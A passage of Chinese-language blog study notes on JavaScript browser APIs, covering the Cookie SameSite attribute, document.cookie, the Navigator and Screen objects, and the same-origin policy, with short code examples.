<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;facebook.com&quot;</span> style=<span class="string">&quot;visibility:hidden;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。</p>
<p>Cookie 的<code>SameSite</code>属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。<br>`</p>
<ul>
<li>Strict</li>
<li>Lax</li>
<li>None<br>`<h6 id="（1）Strict"><a href="#（1）Strict" class="headerlink" title="（1）Strict"></a>（1）Strict</h6></li>
</ul>
<p><code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: CookieName=CookieValue; SameSite=Strict;</span><br></pre></td></tr></table></figure>
<p>这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p>
<h6 id="（2）Lax"><a href="#（2）Lax" class="headerlink" title="（2）Lax"></a>（2）Lax</h6><p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: CookieName=CookieValue; SameSite=Lax;</span><br></pre></td></tr></table></figure>
<p>导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。<br><strong>请求类型            示例                         正常情况                     Lax</strong><br>链接       <code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code>                 发送 Cookie                 发送 Cookie<br>预加载    <code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code>    发送 Cookie                发送 Cookie<br>GET 表单    <code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code>    发送 Cookie                 发送 Cookie<br>POST 表单    <code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code>    发送 Cookie                 不发送<br>iframe      <code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code>        发送 Cookie                 不发送<br>AJAX           <code>$.get(&quot;...&quot;)</code>                    发送 Cookie                 不发送<br>Image           <code>&lt;img src=&quot;...&quot;&gt;</code>                发送 Cookie                 不发送</p>
<p>设置了<code>Strict</code>或<code>Lax</code>以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。</p>
<h6 id="（3）None"><a href="#（3）None" class="headerlink" title="（3）None"></a>（3）None</h6><p>Chrome 计划将<code>Lax</code>变为默认设置。这时，网站可以选择显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p>
<p>下面的设置无效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: widget_session=abc123; SameSite=None</span><br></pre></td></tr></table></figure>
<p>下面的设置有效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: widget_session=abc123; SameSite=None; Secure</span><br></pre></td></tr></table></figure>
<h4 id="4-4-document-cookie"><a href="#4-4-document-cookie" class="headerlink" title="4.4 document.cookie"></a>4.4 document.cookie</h4><p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie <span class="comment">// &quot;foo=bar;baz=bar&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(cookies[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// foo=bar</span></span><br><span class="line"><span class="comment">// baz=bar</span></span><br></pre></td></tr></table></figure>
<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&#x27;fontSize=14&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&#x27;test1=hello&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&#x27;test2=world&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie</span><br><span class="line"><span class="comment">// test1=hello;test2=world</span></span><br></pre></td></tr></table></figure>
<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
<p>各个属性的写入注意点如下。</p>
<ul>
<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
<li><code>max-age</code>属性的值为秒数。</li>
<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
</ul>
<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&#x27;fontSize=14; &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;expires=&#x27;</span> + someDate.toGMTString() + <span class="string">&#x27;; &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;path=/subdirectory; &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;domain=*.example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&#x27;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0057</title>
    <url>/2021/05/31/%E6%89%93%E5%8D%A10057/</url>
    <content><![CDATA[<p><font color=#a3cf62>跟这个世界交手的许多年来，你是否，光彩依旧，兴趣盎然。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="3-Navigator-对象，Screen-对象"><a href="#3-Navigator-对象，Screen-对象" class="headerlink" title="3. Navigator 对象，Screen 对象"></a>3. Navigator 对象，Screen 对象</h3><p><code>window.navigator</code>属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。</p>
<h4 id="3-1-Navigator-对象的属性"><a href="#3-1-Navigator-对象的属性" class="headerlink" title="3.1 Navigator 对象的属性"></a>3.1 Navigator 对象的属性</h4><h5 id="3-1-1-Navigator-userAgent"><a href="#3-1-1-Navigator-userAgent" class="headerlink" title="3.1.1 Navigator.userAgent"></a>3.1.1 Navigator.userAgent</h5><p><code>navigator.userAgent</code>属性返回浏览器的 User Agent 字符串，表示浏览器的厂商和版本信息。</p>
<p>下面是 Chrome 浏览器的<code>userAgent</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.userAgent</span><br><span class="line"><span class="comment">// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot;</span></span><br></pre></td></tr></table></figure>
<p>通过<code>userAgent</code>属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。</p>
<p>不过，通过<code>userAgent</code>可以大致准确地识别手机浏览器，方法就是测试是否包含<code>mobi</code>字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ua = navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="regexp">/mobi/i</span>.test(ua)) &#123;</span><br><span class="line">  <span class="comment">// 手机浏览器</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 非手机浏览器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/mobi|android|touch|mini/i.test(ua)</span><br></pre></td></tr></table></figure>
<h5 id="3-1-2-Navigator-plugins"><a href="#3-1-2-Navigator-plugins" class="headerlink" title="3.1.2 Navigator.plugins"></a>3.1.2 Navigator.plugins</h5><p><code>Navigator.plugins</code>属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pluginsLength = navigator.plugins.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pluginsLength; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(navigator.plugins[i].name);</span><br><span class="line">  <span class="built_in">console</span>.log(navigator.plugins[i].filename);</span><br><span class="line">  <span class="built_in">console</span>.log(navigator.plugins[i].description);</span><br><span class="line">  <span class="built_in">console</span>.log(navigator.plugins[i].version);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-1-3-Navigator-platform"><a href="#3-1-3-Navigator-platform" class="headerlink" title="3.1.3 Navigator.platform"></a>3.1.3 Navigator.platform</h5><p><code>Navigator.platform</code>属性返回用户的操作系统信息，比如<code>MacIntel</code>、<code>Win32</code>、<code>Linux x86_64</code>等 。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.platform</span><br><span class="line"><span class="comment">// &quot;Linux x86_64&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-1-4-Navigator-onLine"><a href="#3-1-4-Navigator-onLine" class="headerlink" title="3.1.4 Navigator.onLine"></a>3.1.4 Navigator.onLine</h5><p><code>navigator.onLine</code>属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.onLine <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的<code>onLine</code>属性会返回<code>true</code>，所以不能假定只要是<code>true</code>，用户就一定能访问互联网。不过，如果是<code>false</code>，可以断定用户一定离线。</p>
<p>用户变成在线会触发<code>online</code>事件，变成离线会触发<code>offline</code>事件，可以通过<code>window.ononline</code>和<code>window.onoffline</code>指定这两个事件的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;offline&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;offline&#x27;</span>); &#125;);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;online&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;online&#x27;</span>); &#125;);</span><br></pre></td></tr></table></figure>
<h5 id="3-1-5-Navigator-language，Navigator-languages"><a href="#3-1-5-Navigator-language，Navigator-languages" class="headerlink" title="3.1.5 Navigator.language，Navigator.languages"></a>3.1.5 Navigator.language，Navigator.languages</h5><p><code>Navigator.language</code>属性返回一个字符串，表示浏览器的首选语言。该属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.language <span class="comment">// &quot;en&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>Navigator.languages</code>属性返回一个数组，表示用户可以接受的语言。<code>Navigator.language</code>总是这个数组的第一个成员。HTTP 请求头信息的<code>Accept-Language</code>字段，就来自这个数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.languages  <span class="comment">// [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</span></span><br></pre></td></tr></table></figure>
<p>如果这个属性发生变化，就会在<code>window</code>对象上触发<code>languagechange</code>事件。</p>
<h5 id="3-1-6-Navigator-geolocation"><a href="#3-1-6-Navigator-geolocation" class="headerlink" title="3.1.6 Navigator.geolocation"></a>3.1.6 Navigator.geolocation</h5><p><code>Navigator.geolocation</code>属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。</p>
<p>Geolocation 对象提供下面三个方法。</p>
<ul>
<li><code>Geolocation.getCurrentPosition()</code>：得到用户的当前位置</li>
<li><code>Geolocation.watchPosition()</code>：监听用户位置变化</li>
<li><code>Geolocation.clearWatch()</code>：取消<code>watchPosition()</code>方法指定的监听函数</li>
</ul>
<p>注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。</p>
<h5 id="3-1-7-Navigator-cookieEnabled"><a href="#3-1-7-Navigator-cookieEnabled" class="headerlink" title="3.1.7 Navigator.cookieEnabled"></a>3.1.7 Navigator.cookieEnabled</h5><p><code>navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.cookieEnabled <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时<code>cookieEnabled</code>返回的还是<code>true</code>。</p>
<h4 id="3-2-Navigator-对象的方法"><a href="#3-2-Navigator-对象的方法" class="headerlink" title="3.2 Navigator 对象的方法"></a>3.2 Navigator 对象的方法</h4><h5 id="3-2-1-Navigator-javaEnabled"><a href="#3-2-1-Navigator-javaEnabled" class="headerlink" title="3.2.1 Navigator.javaEnabled()"></a>3.2.1 Navigator.javaEnabled()</h5><p><code>navigator.javaEnabled()</code>方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.javaEnabled() <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h5 id="3-2-2-Navigator-sendBeacon"><a href="#3-2-2-Navigator-sendBeacon" class="headerlink" title="3.2.2 Navigator.sendBeacon()"></a>3.2.2 Navigator.sendBeacon()</h5><p><code>Navigator.sendBeacon()</code>方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。</p>
<h4 id="3-3-Navigator-的实验性属性"><a href="#3-3-Navigator-的实验性属性" class="headerlink" title="3.3 Navigator 的实验性属性"></a>3.3 Navigator 的实验性属性</h4><p>Navigator 对象有一些实验性属性，在部分浏览器可用。</p>
<h5 id="3-3-1-Navigator-deviceMemory"><a href="#3-3-1-Navigator-deviceMemory" class="headerlink" title="3.3.1 Navigator.deviceMemory"></a>3.3.1 Navigator.deviceMemory</h5><p><code>navigator.deviceMemory</code>属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。</p>
<p>它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回<code>8</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (navigator.deviceMemory &gt; <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;./costly-module.js&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面示例中，只有当前内存大于 1GB，才加载大型的脚本。</p>
<h5 id="3-3-2-Navigator-hardwareConcurrency"><a href="#3-3-2-Navigator-hardwareConcurrency" class="headerlink" title="3.3.2 Navigator.hardwareConcurrency"></a>3.3.2 Navigator.hardwareConcurrency</h5><p><code>navigator.hardwareConcurrency</code>属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。</p>
<p>现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (navigator.hardwareConcurrency &gt; <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;./costly-module.js&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。</p>
<p>该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> workerList = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">window</span>.navigator.hardwareConcurrency; i++) &#123;</span><br><span class="line">  <span class="keyword">let</span> newWorker = &#123;</span><br><span class="line">    worker: <span class="keyword">new</span> Worker(<span class="string">&#x27;cpuworker.js&#x27;</span>),</span><br><span class="line">    inUse: <span class="literal">false</span></span><br><span class="line">  &#125;;</span><br><span class="line">  workerList.push(newWorker);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。</p>
<h5 id="3-3-3-Navigator-connection"><a href="#3-3-3-Navigator-connection" class="headerlink" title="3.3.3 Navigator.connection"></a>3.3.3 Navigator.connection</h5><p><code>navigator.connection</code>属性返回一个对象，包含当前网络连接的相关信息。</p>
<ul>
<li><code>downlink</code>：有效带宽估计值（单位：兆比特/秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。</li>
<li><code>downlinkMax</code>：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。</li>
<li><code>effectiveType</code>：返回连接的等效类型，可能的值为<code>slow-2g</code>、<code>2g</code>、<code>3g</code>、<code>4g</code>。</li>
<li><code>rtt</code>：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。</li>
<li><code>saveData</code>：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回<code>true</code>或者<code>false</code>。</li>
<li><code>type</code>：当前连接的介质类型，可能的值为<code>bluetooth</code>、<code>cellular</code>、<code>ethernet</code>、<code>none</code>、<code>wifi</code>、<code>wimax</code>、<code>other</code>、<code>unknown</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (navigator.connection.effectiveType === <span class="string">&#x27;4g&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;./costly-module.js&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面示例中，如果网络连接是 4G，则加载大型脚本。</p>
<h4 id="3-4-Screen-对象"><a href="#3-4-Screen-对象" class="headerlink" title="3.4 Screen 对象"></a>3.4 Screen 对象</h4><p>Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。<code>window.screen</code>属性指向这个对象。</p>
<p>该对象有下面的属性。</p>
<ul>
<li><code>Screen.height</code>：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。</li>
<li><code>Screen.width</code>：浏览器窗口所在的屏幕的宽度（单位像素）。</li>
<li><code>Screen.availHeight</code>：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于<code>height</code>减去那些被系统组件的高度。</li>
<li><code>Screen.availWidth</code>：浏览器窗口可用的屏幕宽度（单位像素）。</li>
<li><code>Screen.pixelDepth</code>：整数，表示屏幕的色彩位数，比如24表示屏幕提供<code>24</code>位色彩。</li>
<li><code>Screen.colorDepth</code>：<code>Screen.pixelDepth</code>的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。</li>
<li><code>Screen.orientation</code>：返回一个对象，表示屏幕的方向。该对象的<code>type</code>属性是一个字符串，表示屏幕的具体方向，<code>landscape-primary</code>表示横放，<code>landscape-secondary</code>表示颠倒的横放，<code>portrait-primary</code>表示竖放，<code>portrait-secondary</code>表示颠倒的竖放。</li>
</ul>
<p>下面是<code>Screen.orientation</code>的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.screen.orientation</span><br><span class="line"><span class="comment">// &#123; angle: 0, type: &quot;landscape-primary&quot;, onchange: null &#125;</span></span><br></pre></td></tr></table></figure>
<p>下面的例子保证屏幕分辨率大于 1024 x 768。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.screen.width &gt;= <span class="number">1024</span> &amp;&amp; <span class="built_in">window</span>.screen.height &gt;= <span class="number">768</span>) &#123;</span><br><span class="line">  <span class="comment">// 分辨率不低于 1024x768</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是根据屏幕的宽度，将用户导向不同网页的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((screen.width &lt;= <span class="number">800</span>) &amp;&amp; (screen.height &lt;= <span class="number">600</span>)) &#123;</span><br><span class="line">  <span class="built_in">window</span>.location.replace(<span class="string">&#x27;small.html&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">window</span>.location.replace(<span class="string">&#x27;wide.html&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-Navigator 对象，Screen 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0060</title>
    <url>/2021/06/01/%E6%89%93%E5%8D%A10060/</url>
    <content><![CDATA[<p><font color=#009ad6>每个人的一生都是上帝手写的童话。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="6-同源限制"><a href="#6-同源限制" class="headerlink" title="6.同源限制"></a>6.同源限制</h3><p>浏览器安全的基石是“同源政策”（<a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin policy</a> ）。很多开发者都知道这一点，但了解得不全面。</p>
<h4 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 概述"></a>6.1 概述</h4><h5 id="6-1-1-含义"><a href="#6-1-1-含义" class="headerlink" title="6.1.1 含义"></a>6.1.1 含义</h5><p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
<p>最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。<br>`</p>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同（这点可以忽略，详见下文）<br>`</li>
</ul>
<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略），它的同源情况如下。</p>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>：同源</li>
<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>
<li><code>https://www.example.com/dir/page.html</code>：不同源（协议不同）</li>
</ul>
<p>注意，标准规定端口不同的网址不是同源（比如<code>8000</code>端口和<code>8001</code>端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。</p>
<span id="more"></span>
<h5 id="6-1-2-目的"><a href="#6-1-2-目的" class="headerlink" title="6.1.2 目的"></a>6.1.2 目的</h5><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<p>设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
<p>由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
<h5 id="6-1-3-限制范围"><a href="#6-1-3-限制范围" class="headerlink" title="6.1.3 限制范围"></a>6.1.3 限制范围</h5><p>随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。<br>`<br>（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。</p>
<p>（2） 无法接触非同源网页的 DOM。</p>
<p>（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。<br><code> 另外，通过 JavaScript 脚本可以拿到其他窗口的</code>window`对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的window对象的九个属性和四个方法。</p>
<ul>
<li>window.closed</li>
<li>window.frames</li>
<li>window.length</li>
<li>window.location</li>
<li>window.opener</li>
<li>window.parent</li>
<li>window.self</li>
<li>window.top</li>
<li>window.window</li>
<li>window.blur()</li>
<li>window.close()</li>
<li>window.focus()</li>
<li>window.postMessage()</li>
</ul>
<p>上面的九个属性之中，只有<code>window.location</code>是可读写的，其他八个全部都是只读。而且，即使是<code>location</code>对象，非同源的情况下，也只允许调用<code>location.replace()</code>方法和写入<code>location.href</code>属性。</p>
<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。</p>
<h4 id="6-2-Cookie"><a href="#6-2-Cookie" class="headerlink" title="6.2 Cookie"></a>6.2 Cookie</h4><p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>
<p>举例来说，A 网页的网址是<code>http://w1.example.com/a.html</code>，B 网页的网址是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享 Cookie。因为浏览器通过<code>document.domain</code>属性来检查是否同源。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个网页都需要设置</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>注意，A 和 B 两个网页都需要设置<code>document.domain</code>属性，才能达到同源的目的。因为设置<code>document.domain</code>的同时，会把端口重置为<code>null</code>，因此如果只设置一个网页的<code>document.domain</code>，会导致两个网址的端口不同，还是达不到同源的目的。</p>
<p>现在，A 网页通过脚本设置一个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;test1=hello&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>B 网页就可以读到这个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allCookie = <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
